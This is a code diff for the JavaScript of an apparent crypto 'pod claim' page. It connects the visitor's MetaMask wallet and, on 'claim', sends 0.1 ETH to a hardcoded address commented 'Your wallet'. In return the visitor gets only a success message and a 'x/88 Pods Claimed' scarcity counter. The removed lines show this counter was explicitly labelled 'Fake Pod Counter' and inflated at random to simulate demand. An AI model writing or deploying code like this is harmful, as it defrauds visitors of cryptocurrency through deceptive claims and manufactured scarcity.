@@ -1,83 +1,66 @@
-const { ethers } = window.ethers;
-
 const connectBtn = document.getElementById('connect-btn');
 const claimBtn = document.getElementById('claim-btn');
 const walletStatus = document.getElementById('wallet-status');
 const walletAddressSpan = document.getElementById('wallet-address');
 const statusMsg = document.getElementById('status-msg');
+const podCounter = document.getElementById('pod-counter');
 
-let signer;
-let userAddress = null;
+const receiver = "0x9411dE226a239f05CeBfDf0b8A7A22e3101d4B09"; // Your wallet
+let signer, userAddress;
+let claimedPods = parseInt(localStorage.getItem("claimedPods")) || 0;
 
-const RECEIVE_ADDRESS = "0x9411dE226a239f05CeBfDf0b8A7A22e3101d4B09"; // Your wallet
+function updateCounter() {
+  podCounter.innerText = `🌕 ${claimedPods}/88 Pods Claimed`;
+}
+updateCounter();
 
-async function connectWallet() {
+connectBtn.addEventListener('click', async () => {
   if (!window.ethereum) {
-    statusMsg.innerText = "Install MetaMask first!";
-    statusMsg.className = "status-msg error";
+    statusMsg.innerText = "Install MetaMask!";
     return;
   }
   try {
-    await window.ethereum.request({ method: "eth_requestAccounts" });
     const provider = new ethers.BrowserProvider(window.ethereum);
+    await provider.send("eth_requestAccounts", []);
     signer = await provider.getSigner();
     userAddress = await signer.getAddress();
-    walletAddressSpan.innerText = userAddress.slice(0,6) + "..." + userAddress.slice(-4);
     walletStatus.style.display = "block";
+    walletAddressSpan.innerText = userAddress.slice(0,6) + "..." + userAddress.slice(-4);
     connectBtn.style.display = "none";
     claimBtn.disabled = false;
     statusMsg.innerText = "";
   } catch (err) {
     statusMsg.innerText = "Wallet connection rejected.";
-    statusMsg.className = "status-msg error";
   }
-}
-
-connectBtn.addEventListener('click', connectWallet);
+});
 
 claimBtn.addEventListener('click', async () => {
   if (!signer || !userAddress) return;
   claimBtn.disabled = true;
-  statusMsg.innerText = "Processing transaction...";
-  statusMsg.className = "status-msg";
+  statusMsg.innerText = "Sending 0.1 ETH...";
   try {
     const tx = await signer.sendTransaction({
-      to: RECEIVE_ADDRESS,
+      to: receiver,
       value: ethers.parseEther("0.1")
     });
     await tx.wait();
-    statusMsg.innerText = "Success! Pod Claimed. Welcome aboard! 🚀";
-    statusMsg.className = "status-msg success";
-    incrementFakeCounter();
+    statusMsg.innerText = "✅ Pod Claimed! 🚀";
+    claimedPods = Math.min(claimedPods + 1, 88);
+    localStorage.setItem("claimedPods", claimedPods);
+    updateCounter();
   } catch (err) {
-    statusMsg.innerText = "Transaction cancelled or failed.";
-    statusMsg.className = "status-msg error";
+    statusMsg.innerText = "❌ Transaction failed or rejected.";
   }
   claimBtn.disabled = false;
 });
 
-// Fake Pod Counter
-const podCounter = document.getElementById('pod-counter');
-let fakePods = 23;
-function updateCounter() {
-  podCounter.innerText = `🌕 ${fakePods}/88 Pods Claimed`;
-}
-function incrementFakeCounter() {
-  if (fakePods < 88) {
-    fakePods += 1 + (Math.random() < 0.12 ? 1 : 0);
-    updateCounter();
-    if (fakePods > 88) fakePods = 88;
-  }
-}
-updateCounter();
-
-// Audio Toggle
-const audio = document.getElementById('space-audio');
-const audioToggle = document.getElementById('audio-toggle');
-const audioIcon = document.getElementById('audio-icon');
+// Audio toggle
+const audio = document.getElementById("space-audio");
+const audioToggle = document.getElementById("audio-toggle");
+const audioIcon = document.getElementById("audio-icon");
 let isAudioOn = false;
 
-audioToggle.addEventListener('click', function() {
+audioToggle.addEventListener('click', () => {
   isAudioOn = !isAudioOn;
   audioIcon.innerText = isAudioOn ? "🔈" : "🔊";
   if (isAudioOn) {
